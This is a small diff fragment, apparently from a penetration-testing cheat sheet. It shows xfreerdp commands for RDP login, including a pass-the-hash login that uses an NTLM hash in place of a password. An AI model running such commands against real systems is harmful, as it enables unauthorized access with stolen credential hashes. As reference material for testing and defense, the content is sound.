@@ -20,3 +20,5 @@ root@payload$ xfreerdp /v:10.0.0.1 /u:username # password will be asked
 # require freerdp2-x11 freerdp2-shadow-x11 packages instead of freerdp-x11
 root@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d  
 ```
+
+
